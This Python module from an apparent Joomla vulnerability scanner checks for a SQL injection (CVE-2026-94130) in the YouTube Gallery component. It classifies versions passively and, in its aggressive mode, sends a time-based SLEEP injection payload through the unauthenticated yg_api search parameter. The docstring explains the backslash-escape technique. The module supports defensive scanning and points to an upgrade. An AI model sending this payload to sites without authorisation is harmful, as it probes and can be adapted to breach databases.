from __future__ import annotations

import re
import time
from typing import Any
from urllib.parse import urlencode

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-94130"
NAME = "YouTube Gallery unauthenticated video-search SQL injection"
COMPONENT = "YouTube Gallery"
AFFECTED_RULE = "YouTube Gallery 1.0.0 through 5.7.2; fixed in 5.7.3"
HAS_EXPLOIT = True
INTRUSIVE = False
EXPLOIT_MODES = ["safe", "aggressive"]
API_PATH = "/index.php"
SLEEP_THRESHOLD = 1.2
PAYLOAD = "\\,,))OR(SLEEP({delay}))#"


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("5.7.3")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("youtubegallery", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="YouTube Gallery was not detected through its administrator manifest or component route.", action="No action is required unless YouTube Gallery is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected YouTube Gallery {version}, within the affected range below 5.7.3. The public yg_api search accepts unsanitised ygsearchquery values."
        action = "Upgrade YouTube Gallery to 5.7.3 or newer."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected YouTube Gallery {version}, which quotes the search value in addSearchQuery()."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "YouTube Gallery was detected, but its version could not be determined."
        action = "Determine the installed YouTube Gallery version and upgrade to 5.7.3 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def _api_url(base: str, list_id: int, theme_id: int, search: str | None) -> str:
    query: dict[str, str] = {
        "option": "com_youtubegallery",
        "view": "youtubegallery",
        "listid": str(list_id),
        "themeid": str(theme_id),
        "yg_api": "1",
    }
    if search is not None:
        query["ygsearchfields"] = "es_title"
        query["ygsearchquery"] = search
    return f"{base}{API_PATH}?{urlencode(query)}"


def _timed_get(client: HttpClient, url: str, timeout: int) -> tuple[dict[str, Any], float]:
    start = time.perf_counter()
    response = client.get(url, timeout=timeout)
    return response, time.perf_counter() - start


def run_aggressive_probe(
    target_url: str,
    list_id: int = 1,
    theme_id: int = 1,
    delay: int = 2,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Compare a benign search with the backslash-escape SLEEP payload.

    5.7.2 builds ``INSTR(es_title,"<value>")`` from the raw ``ygsearchquery``.
    Two comma-separated words let the first backslash escape the closing quote
    and the second word close the expression and append ``OR(SLEEP(n))``.
    5.7.3 quotes the value with the database driver, so the payload is inert.
    """
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    baseline_url = _api_url(base, list_id, theme_id, "proofcms")
    baseline, baseline_time = _timed_get(client, baseline_url, timeout)
    if is_transport_error(baseline):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=baseline_url, detail=f"The benign yg_api request failed in transit ({transport_error_detail(baseline)}).", action="Retry when the target is reachable.")

    probe_value = PAYLOAD.format(delay=delay)
    probe_url = _api_url(base, list_id, theme_id, probe_value)
    probe, probe_time = _timed_get(client, probe_url, timeout)
    if is_transport_error(probe):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=probe_url, detail=f"The SQLi probe request failed in transit ({transport_error_detail(probe)}).", action="Retry when the target is reachable.")

    delta = probe_time - baseline_time
    evidence = {
        "list_id": list_id,
        "theme_id": theme_id,
        "delay": delay,
        "payload": probe_value,
        "baseline_status": baseline.get("status"),
        "baseline_seconds": round(baseline_time, 3),
        "probe_status": probe.get("status"),
        "probe_seconds": round(probe_time, 3),
        "delta_seconds": round(delta, 3),
        "sleep_threshold": SLEEP_THRESHOLD,
    }
    if baseline.get("status") == 200 and probe.get("status") == 200 and delta >= SLEEP_THRESHOLD:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=probe_url,
            evidence=evidence,
            detail=(
                "The unauthenticated yg_api search reached the video query and the backslash-escape payload "
                f"added {delta:.2f}s over the benign request (SLEEP({delay}) runs in the count and row queries)."
            ),
            action="Upgrade YouTube Gallery to 5.7.3 or newer.",
        )
    status = "BLOCKED_EXTERNAL" if baseline.get("status") in (403, 404, 500) or probe.get("status") in (403, 404, 500) else "NOT_CONFIRMED"
    detail = (
        f"The yg_api search returned HTTP {probe.get('status')} without the SLEEP delay; seed a published "
        "video list/theme and pass --aggressive-arg list_id=... theme_id=... on a target with a gallery."
    )
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=probe_url, evidence=evidence, detail=detail, action="Upgrade affected YouTube Gallery versions even when the external proof is inconclusive.")


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}/index.php?option=com_youtubegallery"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The YouTube Gallery page could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The component page is reachable; the yg_api search payload was not sent in safe mode.", action="Use aggressive mode with a published list/theme on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because YouTube Gallery was not detected as potentially affected."
            return passive
        list_value = aggressive_value(aggressive_args, aggressive_command, "list_id")
        theme_value = aggressive_value(aggressive_args, aggressive_command, "theme_id")
        delay_value = aggressive_value(aggressive_args, aggressive_command, "delay")
        result = run_aggressive_probe(
            target_url,
            list_id=int(list_value) if list_value and list_value.isdigit() else 1,
            theme_id=int(theme_value) if theme_value and theme_value.isdigit() else 1,
            delay=int(delay_value) if delay_value and delay_value.isdigit() else 2,
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (component reachability) and aggressive (yg_api search timing) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "SQL Injection", "module_version": "1.0.0", "last_reviewed": "2026-11-17", "updated": "2026-11-17", "required_detectors": ["youtubegallery"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-94130", "https://www.joomlaboat.com", "https://github.com/joomlaboat/youtubegallery/commit/1f35984d3139dd20ae3b85ebeb69c79ebe1a489a"]}
